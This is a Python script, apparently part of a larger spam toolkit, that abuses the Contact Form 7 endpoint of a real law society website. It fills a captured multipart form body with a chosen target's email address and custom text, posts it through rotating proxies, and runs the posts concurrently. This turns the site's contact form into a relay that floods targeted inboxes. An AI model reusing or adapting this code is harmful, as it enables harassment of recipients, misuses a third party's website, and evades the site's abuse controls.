import requests

import module

url = 'https://www.citysolicitors.org.uk/clls/wp-json/contact-form-7/v1/contact-forms/2295/feedback'


headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarye8yjggzXIHPjq0Wb',
}

params = {
    '_locale': 'user',
}
DATA = '------WebKitFormBoundarye8yjggzXIHPjq0Wb\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n2295\r\n------WebKitFormBoundarye8yjggzXIHPjq0Wb\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.4\r\n------WebKitFormBoundarye8yjggzXIHPjq0Wb\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nen_US\r\n------WebKitFormBoundarye8yjggzXIHPjq0Wb\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f2295-p85-o1\r\n------WebKitFormBoundarye8yjggzXIHPjq0Wb\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n85\r\n------WebKitFormBoundarye8yjggzXIHPjq0Wb\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n\r\n------WebKitFormBoundarye8yjggzXIHPjq0Wb\r\nContent-Disposition: form-data; name="your-name"\r\n\r\ntest\r\n------WebKitFormBoundarye8yjggzXIHPjq0Wb\r\nContent-Disposition: form-data; name="your-email"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundarye8yjggzXIHPjq0Wb\r\nContent-Disposition: form-data; name="textarea-554"\r\n\r\ntest\r\n------WebKitFormBoundarye8yjggzXIHPjq0Wb\r\nContent-Disposition: form-data; name="text-637"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundarye8yjggzXIHPjq0Wb--\r\n'


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        data = DATA.replace('test', self.get_text()).replace('softumwork@gmail.com', target)
        response = requests.post(url, params=params, headers=headers, data=data.encode(), proxies=self.get_proxies())
        return response


if __name__ == '__main__':
    project_name = 'citysolicitors'
    success_message = 'Thank you for your message'

    spam = ConcreteSpam(project_name, success_message)
    res = spam.send_post()
    if res:
        spam.run_concurrently()
